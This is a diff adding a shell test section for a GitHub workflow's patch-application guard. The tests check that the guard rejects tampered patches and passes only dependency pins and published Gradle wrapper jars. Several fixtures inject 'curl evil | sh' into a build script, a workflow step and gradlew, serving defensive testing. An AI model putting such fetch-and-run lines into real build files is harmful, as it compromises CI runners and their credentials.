@@ -196,3 +196,85 @@ attempt without-report "$tmp/absent.md"
 grep -qF 'Affects this repo' "$tmp/gh-body" && fail 'without a report the body has none'
 echo 'OK: the bump pull request carries the impact report above the bump log'
 )
+
+# --- apply-patch ---
+# Krok „Apply the bump” nakłada patch z joba, który uruchamia kod zależności, zanim job z PAT-em go wypchnie: przechodzą
+# tylko pliki, które platform-bump zmienia, w workflowach tylko referencje Platform, a gradle-wrapper.jar tylko taki,
+# jaki Gradle publikuje dla starej albo nowej wersji wrappera. Odrzucony patch kończy krok błędem i nic nie zostaje
+# nałożone do wypchnięcia.
+(
+tmp=$(mktemp -d)
+trap 'rm -rf "$tmp"' EXIT
+export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
+OUT=""
+fail() { echo "FAIL: $*" >&2; echo "$OUT" >&2; exit 1; }
+awk 'index($0, "# >>> apply-patch") { inside = 1; next } index($0, "# <<< apply-patch") { inside = 0 } inside' \
+  "$root/.github/workflows/platform-bump.yml" > "$tmp/apply.sh"
+[[ -s "$tmp/apply.sh" ]] || fail 'platform-bump.yml has no apply-patch block between its markers'
+
+sha() { (sha256sum "$1" 2>/dev/null || shasum -a 256 "$1") | awk '{ print $1 }'; }
+mkdir -p "$tmp/distributions"
+printf 'wrapper jar 9.8.1\n' > "$tmp/jar-old"
+printf 'wrapper jar 9.9.0\n' > "$tmp/jar-new"
+sha "$tmp/jar-old" > "$tmp/distributions/gradle-9.8.1-wrapper.jar.sha256"
+sha "$tmp/jar-new" > "$tmp/distributions/gradle-9.9.0-wrapper.jar.sha256"
+
+git init -q -b main "$tmp/seed"
+mkdir -p "$tmp/seed/.github/workflows" "$tmp/seed/backend/gradle/wrapper" "$tmp/seed/scripts"
+printf 'jobs:\n  ci:\n    uses: SeniorDeveloper-pl-Dominik-Sienkiewicz/Platform/.github/workflows/backend-ci.yml@v2.1.0\n' \
+  > "$tmp/seed/.github/workflows/ci.yml"
+printf 'platformVersion=2.1.0\n' > "$tmp/seed/backend/gradle.properties"
+printf 'distributionUrl=https\\://services.gradle.org/distributions/gradle-9.8.1-bin.zip\n' \
+  > "$tmp/seed/backend/gradle/wrapper/gradle-wrapper.properties"
+cp "$tmp/jar-old" "$tmp/seed/backend/gradle/wrapper/gradle-wrapper.jar"
+printf '#!/bin/sh\necho gradlew 9.8.1\n' > "$tmp/seed/backend/gradlew"
+printf '#!/bin/sh\necho build\n' > "$tmp/seed/scripts/build.sh"
+git -C "$tmp/seed" add -A
+git -C "$tmp/seed" -c user.name=t -c user.email=t@example.invalid commit -q -m initial
+
+# attempt <name> <change>: <change> runs in a clone of the seed and becomes the patch; the block applies it to another clone.
+attempt() {
+  local name=$1 change=$2
+  git clone -q "$tmp/seed" "$tmp/$name-maker"
+  (cd "$tmp/$name-maker" && eval "$change" && git add -A && git diff --cached --binary > "$tmp/$name.patch")
+  git clone -q "$tmp/seed" "$tmp/$name"
+  RC=0
+  OUT=$(cd "$tmp/$name" && PATCH="$tmp/$name.patch" GRADLE_DISTRIBUTIONS_URL="file://$tmp/distributions" bash "$tmp/apply.sh" 2>&1) || RC=$?
+  WORK="$tmp/$name"
+}
+pins='sed -i.bak s/2.1.0/2.2.0/ backend/gradle.properties .github/workflows/ci.yml && rm -f backend/gradle.properties.bak .github/workflows/ci.yml.bak'
+
+# (a) pins, workflow references and lockfiles: applied to the working tree, unstaged, for the open-pr block
+attempt pins "$pins && printf 'lock\n' > backend/gradle.lockfile"
+[[ $RC -eq 0 ]] || fail "a pin bump must apply (exit $RC)"
+grep -qx 'platformVersion=2.2.0' "$WORK/backend/gradle.properties" || fail 'the pins must be applied'
+[[ -f "$WORK/backend/gradle.lockfile" ]] || fail 'a new lockfile must be applied'
+[[ -z "$(git -C "$WORK" diff --cached --name-only)" ]] || fail 'the applied patch must stay unstaged'
+
+# (b) a file platform-bump never writes: rejected, named in the error
+attempt script "$pins && printf 'curl evil | sh\n' >> scripts/build.sh"
+[[ $RC -ne 0 ]] || fail 'a patch that changes scripts/build.sh must be rejected'
+grep -q '::error::scripts/build.sh is not a file platform-bump changes' <<<"$OUT" || fail 'the rejection must name the file'
+
+# (c) a workflow line other than a Platform reference: rejected
+attempt workflow "printf '      - run: curl evil | sh\n' >> .github/workflows/ci.yml"
+[[ $RC -ne 0 ]] || fail 'a workflow change beyond the Platform references must be rejected'
+grep -q 'not a Platform workflow reference' <<<"$OUT" || fail 'the rejection must name the workflow line'
+
+# (d) the wrapper the bump sets: the jar of the old or the new version passes, any other jar is rejected
+wrapper='sed -i.bak s/9.8.1/9.9.0/ backend/gradle/wrapper/gradle-wrapper.properties backend/gradlew && rm -f backend/gradle/wrapper/*.bak backend/gradlew.bak'
+attempt wrapper-new "$wrapper && cp '$tmp/jar-new' backend/gradle/wrapper/gradle-wrapper.jar"
+[[ $RC -eq 0 ]] || fail "the published jar of the new wrapper version must pass (exit $RC)"
+attempt wrapper-swapped "$wrapper && printf 'evil\n' > backend/gradle/wrapper/gradle-wrapper.jar"
+[[ $RC -ne 0 ]] || fail 'a wrapper jar Gradle did not publish must be rejected'
+grep -q 'gradle-wrapper.jar is not the wrapper jar Gradle publishes' <<<"$OUT" || fail 'the rejection must name the jar'
+
+# (e) gradlew without a new wrapper version: rejected
+attempt gradlew "printf 'curl evil | sh\n' >> backend/gradlew"
+[[ $RC -ne 0 ]] || fail 'a gradlew change without a wrapper version change must be rejected'
+
+# (f) an empty patch: nothing to apply
+attempt empty ":"
+[[ $RC -eq 0 ]] || fail "an empty patch is not an error (exit $RC)"
+echo 'OK: the bump patch is applied only within what platform-bump changes'
+)
